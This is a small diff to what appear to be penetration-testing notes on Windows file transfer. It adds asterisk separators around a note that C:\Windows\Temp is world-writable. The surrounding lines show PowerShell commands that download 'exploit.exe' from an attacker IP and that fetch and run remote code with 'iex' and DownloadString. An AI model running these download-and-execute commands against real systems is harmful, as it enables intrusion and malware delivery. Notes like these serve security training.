@@ -13,8 +13,9 @@ Example:
 ```
 powershell -c "Invoke-WebRequest -Uri '10.10.100.254/exploit.exe' -OutFile 'C:\Windows\Temp\exploit.exe'"
 ```
+*********************************************************************************
 Note: C:\Windows\Temp is commonly world writable
-
+*********************************************************************************
 ### Another useful command to achieve succesful http file transfer via powershell:
 ```
 powershell iex (New-Object Net.WebClient).DownloadString('http://[HTTP-SERVER-IP]:[PORT]/[FILE])
